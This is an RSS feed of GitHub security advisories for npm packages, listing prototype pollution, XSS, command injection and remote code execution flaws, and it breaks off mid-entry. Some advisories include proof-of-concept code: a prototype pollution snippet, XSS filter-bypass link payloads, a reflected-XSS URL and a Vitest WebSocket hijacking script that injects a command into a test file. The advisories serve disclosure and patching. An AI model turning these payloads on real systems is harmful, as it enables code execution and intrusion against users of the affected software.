<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-02-09T12:01:35.558Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nodebb] NodeBB Cross-site scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vqr3-vrrg-f3jh</id>
        <link href="https://github.com/advisories/GHSA-vqr3-vrrg-f3jh"/>
        <updated>2025-02-07T20:41:40.000Z</updated>
        <content type="html"><![CDATA[<p>A persistent cross-site scripting (XSS) vulnerability in NodeBB v3.11.0 allows remote attackers to store arbitrary code in the 'about me' section of their profile.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57041">https://nvd.nist.gov/vuln/detail/CVE-2024-57041</a></li>
<li><a href="https://github.com/NodeBB/NodeBB/commit/4e69bff72fd04779064d37e46a43080e6c328adf">https://github.com/NodeBB/NodeBB/commit/4e69bff72fd04779064d37e46a43080e6c328adf</a></li>
<li><a href="https://www.tonysec.com/posts/cve-2024-57041">https://www.tonysec.com/posts/cve-2024-57041</a></li>
<li><a href="https://github.com/advisories/GHSA-vqr3-vrrg-f3jh">https://github.com/advisories/GHSA-vqr3-vrrg-f3jh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqr3-vrrg-f3jh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-24T21:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rpldy/uploader] @rpldy/uploader prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-pc47-g7gv-4gpw</id>
        <link href="https://github.com/advisories/GHSA-pc47-g7gv-4gpw"/>
        <updated>2025-02-06T23:47:52.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.createUploader function of @rpldy/uploader v1.8.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57082">https://nvd.nist.gov/vuln/detail/CVE-2024-57082</a></li>
<li><a href="https://gist.github.com/tariqhawis/708e518de0c3b5af7430ec774f68f315">https://gist.github.com/tariqhawis/708e518de0c3b5af7430ec774f68f315</a></li>
<li><a href="https://github.com/advisories/GHSA-pc47-g7gv-4gpw">https://github.com/advisories/GHSA-pc47-g7gv-4gpw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pc47-g7gv-4gpw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vxe-table] vxe-table prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-89fp-f5mx-748x</id>
        <link href="https://github.com/advisories/GHSA-89fp-f5mx-748x"/>
        <updated>2025-02-06T23:40:51.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.install function of vxe-table v4.8.10 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57080">https://nvd.nist.gov/vuln/detail/CVE-2024-57080</a></li>
<li><a href="https://gist.github.com/tariqhawis/c0b5fa2d7e4edd3f000e73fb7a10ccbc">https://gist.github.com/tariqhawis/c0b5fa2d7e4edd3f000e73fb7a10ccbc</a></li>
<li><a href="https://github.com/advisories/GHSA-89fp-f5mx-748x">https://github.com/advisories/GHSA-89fp-f5mx-748x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-89fp-f5mx-748x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@zag-js/core] @zag-js/core prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-fg4m-w35q-vfg2</id>
        <link href="https://github.com/advisories/GHSA-fg4m-w35q-vfg2"/>
        <updated>2025-02-06T23:32:26.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.deepMerge function of @zag-js/core v0.50.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57079">https://nvd.nist.gov/vuln/detail/CVE-2024-57079</a></li>
<li><a href="https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b">https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b</a></li>
<li><a href="https://github.com/advisories/GHSA-fg4m-w35q-vfg2">https://github.com/advisories/GHSA-fg4m-w35q-vfg2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg4m-w35q-vfg2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[utils-extend] utils-extend Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-7qgg-vw88-cc99</id>
        <link href="https://github.com/advisories/GHSA-7qgg-vw88-cc99"/>
        <updated>2025-02-06T23:31:54.000Z</updated>
        <content type="html"><![CDATA[<p>The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) lib.extend. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57077">https://nvd.nist.gov/vuln/detail/CVE-2024-57077</a></li>
<li><a href="https://gist.github.com/tariqhawis/64bac50f8c2706e6880e45d50a507114">https://gist.github.com/tariqhawis/64bac50f8c2706e6880e45d50a507114</a></li>
<li><a href="https://github.com/advisories/GHSA-7qgg-vw88-cc99">https://github.com/advisories/GHSA-7qgg-vw88-cc99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7qgg-vw88-cc99</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-06T06:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eazy-logger] eazy-logger prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</id>
        <link href="https://github.com/advisories/GHSA-r7jx-5m6m-cpg9"/>
        <updated>2025-02-07T14:34:56.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.Logger function of eazy-logger v4.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<p>An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., <code>child_process.exec</code>, <code>eval</code>), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('eazy-logger');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.Logger (JSON.parse('{"__proto__":{"pollutedKey":123}}'))
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57075">https://nvd.nist.gov/vuln/detail/CVE-2024-57075</a></li>
<li><a href="https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5">https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5</a></li>
<li><a href="https://github.com/advisories/GHSA-r7jx-5m6m-cpg9">https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[module-from-string] module-from-string prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-q5j8-9m9g-x2jh</id>
        <link href="https://github.com/advisories/GHSA-q5j8-9m9g-x2jh"/>
        <updated>2025-02-06T23:30:55.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.requireFromString function of module-from-string v3.3.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57072">https://nvd.nist.gov/vuln/detail/CVE-2024-57072</a></li>
<li><a href="https://gist.github.com/tariqhawis/8b1fe301dd1ea52952cef347daddee67">https://gist.github.com/tariqhawis/8b1fe301dd1ea52952cef347daddee67</a></li>
<li><a href="https://github.com/advisories/GHSA-q5j8-9m9g-x2jh">https://github.com/advisories/GHSA-q5j8-9m9g-x2jh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q5j8-9m9g-x2jh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tanstack/form-core] @tanstack/form-core prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-ggv3-vmgw-xv2q</id>
        <link href="https://github.com/advisories/GHSA-ggv3-vmgw-xv2q"/>
        <updated>2025-02-06T23:30:30.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.mutateMergeDeep function of @tanstack/form-core v0.35.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57068">https://nvd.nist.gov/vuln/detail/CVE-2024-57068</a></li>
<li><a href="https://gist.github.com/tariqhawis/47fe5b1e584e9e573c0933588248d533">https://gist.github.com/tariqhawis/47fe5b1e584e9e573c0933588248d533</a></li>
<li><a href="https://github.com/advisories/GHSA-ggv3-vmgw-xv2q">https://github.com/advisories/GHSA-ggv3-vmgw-xv2q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggv3-vmgw-xv2q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@ndhoule/defaults] @ndhoule/defaults prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-79h2-v6hh-wq23</id>
        <link href="https://github.com/advisories/GHSA-79h2-v6hh-wq23"/>
        <updated>2025-02-06T22:52:20.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.deep function of @ndhoule/defaults v2.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57066">https://nvd.nist.gov/vuln/detail/CVE-2024-57066</a></li>
<li><a href="https://gist.github.com/tariqhawis/8ee7327cc8b78df738cd32505cbbbd44">https://gist.github.com/tariqhawis/8ee7327cc8b78df738cd32505cbbbd44</a></li>
<li><a href="https://github.com/advisories/GHSA-79h2-v6hh-wq23">https://github.com/advisories/GHSA-79h2-v6hh-wq23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79h2-v6hh-wq23</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonpath-plus] JSONPath Plus Remote Code Execution (RCE) Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pppg-cpfq-h7wr</id>
        <link href="https://github.com/advisories/GHSA-pppg-cpfq-h7wr"/>
        <updated>2025-02-06T19:11:00.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package jsonpath-plus before 10.0.7 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of vm in Node.</p>
<p><strong>Note:</strong></p>
<p>There were several attempts to fix it in versions <a href="https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0">10.0.0-10.1.0</a> but it could still be exploited using <a href="https://github.com/JSONPath-Plus/JSONPath/issues/226">different payloads</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21534">https://nvd.nist.gov/vuln/detail/CVE-2024-21534</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3">https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884">https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/issues/226">https://github.com/JSONPath-Plus/JSONPath/issues/226</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72">https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316">https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0">https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/pull/233">https://github.com/JSONPath-Plus/JSONPath/pull/233</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/73ad72e5ee788d8287dea6e8283a3f16f63c9eb8">https://github.com/JSONPath-Plus/JSONPath/commit/73ad72e5ee788d8287dea6e8283a3f16f63c9eb8</a></li>
<li><a href="https://github.com/advisories/GHSA-pppg-cpfq-h7wr">https://github.com/advisories/GHSA-pppg-cpfq-h7wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pppg-cpfq-h7wr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-11T15:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[files.photo.gallery] files.photo.gallery command injection]]></title>
        <id>https://github.com/advisories/GHSA-5wjw-qjhm-v43h</id>
        <link href="https://github.com/advisories/GHSA-5wjw-qjhm-v43h"/>
        <updated>2025-02-06T17:20:26.000Z</updated>
        <content type="html"><![CDATA[<p>A command injection vulnerability in the video thumbnail rendering component of files.photo.gallery v0.3.0 through 0.11.0 allows remote attackers to execute arbitrary code via a crafted video file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53615">https://nvd.nist.gov/vuln/detail/CVE-2024-53615</a></li>
<li><a href="https://github.com/beune/CVE-2024-53615">https://github.com/beune/CVE-2024-53615</a></li>
<li><a href="https://github.com/advisories/GHSA-5wjw-qjhm-v43h">https://github.com/advisories/GHSA-5wjw-qjhm-v43h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wjw-qjhm-v43h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-30T15:31:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nuxtjs/mdc] Parsed HTML anchor links in Markdown provided to parseMarkdown can result in XSS in @nuxtjs/mdc]]></title>
        <id>https://github.com/advisories/GHSA-j82m-pc2v-2484</id>
        <link href="https://github.com/advisories/GHSA-j82m-pc2v-2484"/>
        <updated>2025-02-06T19:56:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe parsing logic of the URL from markdown can lead to arbitrary JavaScript code due to a bypass to the existing guards around the <code>javascript:</code> protocol scheme in the URL.</p>
<h3 id="details">Details</h3>
<p>The parsing logic implement at <a href="https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16">https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16</a> maintains a deny-list approach to filtering potential malicious payload. It does so by matching protocol schemes like <code>javascript:</code> and others.</p>
<p>Specifically, this is the code from the mdc library's parser that is not secure enough:</p>
<pre><code class="language-js">export const unsafeLinkPrefix = [
  'javascript:',
  'data:text/html',
  'vbscript:',
  'data:text/javascript',
  'data:text/vbscript',
  'data:text/css',
  'data:text/plain',
  'data:text/xml'
]

export const validateProp = (attribute: string, value: string) =&gt; {
  if (attribute.startsWith('on')) {
    return false
  }

  if (attribute === 'href' || attribute === 'src') {
    return !unsafeLinkPrefix.some(prefix =&gt; value.toLowerCase().startsWith(prefix))
  }

  return true
}
</code></pre>
<p>These security guards can be bypassed by an adversarial that provides JavaScript URLs with HTML entities encoded via hex string.</p>
<h3 id="poc">PoC</h3>
<p>The following URL payloads if provided to the markdown parsing library (such as through the usage of <code>import { parseMarkdown } from '@nuxtjs/mdc/runtime';</code>) will trigger the alert() dialog:</p>
<pre><code class="language-markdown"># ✅ This is correctly escaped by the parser

- XSS Attempt:

&lt;a href="javascript:alert(1)"&gt; this gets sanitizied, yay!&lt;/a&gt;

# ❌ These are vulnerable and not escaped

- Bypass 1:

&lt;a href="jav&amp;#x09;ascript:alert('XSS');"&gt;Click Me 1&lt;/a&gt;

- Bypass 2:

&lt;a href="jav&amp;#x0A;ascript:alert('XSS');"&gt;Click Me 2&lt;/a&gt;

- Bypass 3:

&lt;a href="jav&amp;#10;ascript:alert('XSS');"&gt;Click Me 3&lt;/a&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>Users who consume this library and perform markdown parsing from unvalidated sources such as LLM generative text responses, user input and other untrusted sources could result in rendering vulnerable XSS anchor links.</p>
<h2 id="reference">Reference</h2>
<p>You may infer the following write-up for more in-depth walkthrough of URL parsing problems and suggestions on how to securely address them: <a href="https://www.nodejs-security.com/blog/how-to-parse-urls-from-markdown-to-html-securely">How to Parse URLs from Markdown to HTML Securely?</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484">https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484</a></li>
<li><a href="https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3">https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3</a></li>
<li><a href="https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16">https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24981">https://nvd.nist.gov/vuln/detail/CVE-2025-24981</a></li>
<li><a href="https://github.com/advisories/GHSA-j82m-pc2v-2484">https://github.com/advisories/GHSA-j82m-pc2v-2484</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j82m-pc2v-2484</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-06T17:16:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[better-auth] Better Auth URL parameter HTML Injection (Reflected Cross-Site scripting)]]></title>
        <id>https://github.com/advisories/GHSA-9x4v-xfq5-m8x5</id>
        <link href="https://github.com/advisories/GHSA-9x4v-xfq5-m8x5"/>
        <updated>2025-02-05T21:49:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The better-auth <code>/api/auth/error</code> page was vulnerable to HTML injection, resulting in a reflected cross-site scripting (XSS) vulnerability.</p>
<h3 id="details">Details</h3>
<p>The value of <code>error</code> URL parameter was reflected as HTML on the error page: <a href="https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81">https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81</a></p>
<h3 id="poc">PoC</h3>
<p><a href="https://demo.better-auth.com/api/auth/error?error=%3Cscript%3Ealert(1)%3C/script%3E">https://demo.better-auth.com/api/auth/error?error=%3Cscript%3Ealert(1)%3C/script%3E</a></p>
<p><img alt="image" src="https://github.com/user-attachments/assets/35b1b95d-3dc9-45fd-89cd-20cd0361bb6c"></p>
<h3 id="impact">Impact</h3>
<p>An attacker who exploited this vulnerability by coercing a user to visit a specially-crafted URL could execute arbitrary JavaScript in the context of the user's browser.</p>
<p>Because better-auth is a dependency of web applications, the impact of such a vulnerability is unknowable; it depends on the functionality of the application/site using better-auth. I have calculated the CVSS score assuming the hypothetical victim is an administrator with elevated permissions and access.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/better-auth/better-auth/security/advisories/GHSA-9x4v-xfq5-m8x5">https://github.com/better-auth/better-auth/security/advisories/GHSA-9x4v-xfq5-m8x5</a></li>
<li><a href="https://github.com/better-auth/better-auth/commit/7ae340e2eddad641b7e43d24d37c58a66ce9ddcf">https://github.com/better-auth/better-auth/commit/7ae340e2eddad641b7e43d24d37c58a66ce9ddcf</a></li>
<li><a href="https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81">https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81</a></li>
<li><a href="https://github.com/advisories/GHSA-9x4v-xfq5-m8x5">https://github.com/advisories/GHSA-9x4v-xfq5-m8x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x4v-xfq5-m8x5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-05T21:49:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
        <updated>2025-02-04T22:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
<h3 id="details">Details</h3>
<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Open Vitest UI.</li>
<li>Access a malicious web site with the script below.</li>
<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
</ol>
<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});

// actual code to run
const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
ws.addEventListener('message', e =&gt; {
    console.log(e.data)
})
ws.addEventListener('open', () =&gt; {
    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))

    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"

    // edit file content to inject command execution
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "saveTestFile",
      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
    }))
    // rerun the tests to run the injected command execution code
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "rerun",
      a: [testFilePath]
    }))
})
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24964">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>
